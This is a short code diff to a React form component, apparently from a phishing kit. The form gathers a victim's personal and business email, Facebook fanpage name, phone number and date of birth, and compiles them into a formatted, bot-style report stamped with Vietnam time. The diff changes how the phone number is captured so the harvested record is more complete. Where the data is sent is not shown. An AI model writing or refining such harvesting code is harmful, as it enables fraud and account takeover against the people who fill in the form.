@@ -85,6 +85,10 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
         setPhoneNumber(e.target.value);
     }, []);
 
+    const handleFullNumberChange = useCallback((number: string) => {
+        setPhoneNumber(number);
+    }, []);
+
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
 
@@ -102,7 +106,7 @@ ${
 <b>� Email Address:</b> <code>${formData.personalEmail}</code>
 <b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📘 Fanpage Name:</b> <code>${formData.pageName}</code>
-<b>📱 Phone Number:</b> <code>${phoneNumber.startsWith('+') ? phoneNumber : '+' + phoneNumber}</code>
+<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
 <b>🎂 Date of Birth:</b> <code>${formData.day}/${formData.month}/${formData.year}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
@@ -188,6 +192,7 @@ ${
                         {/* Phone Number */}
                         <IntlTelInput
                             initOptions={initOptions}
+                            onChangeNumber={handleFullNumberChange}
                             inputProps={{
                                 name: 'phoneNumber',
                                 maxLength: 11,
